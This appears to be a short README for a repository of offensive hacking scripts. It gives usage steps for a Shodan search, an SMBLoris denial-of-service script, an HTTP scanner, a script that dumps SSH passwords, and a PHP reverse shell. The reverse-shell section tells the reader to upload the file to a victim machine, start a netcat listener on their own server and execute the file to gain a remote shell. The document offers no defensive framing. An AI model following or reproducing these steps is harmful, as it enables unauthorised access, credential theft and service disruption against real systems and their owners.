#Th1s 1s a rep0 ab0ut h3cking scr1pts

#shodan
shodancount.py <search query>
shodansearch.py <search query>

#smbloris
chmod +x run10.sh
sh run10.sh

#httpscan
httpscan.py <ip>

#dump_ssh_password
chmod +x ssh_password.sh
sh password.sh
open a new window to ssh login , you'll see the ssh password

#php-reverse-shell
modify the $ip and $port in php-reverse-shell.php in line 49 and 50
upload php-reverse-shell.php to the victim machine
login to your vps,listen the port
nc -lvp 1234
execute the php on the victim machine,you'll get the reverse shell
php php-reverse-shell.php

Hope you enjoy ^_^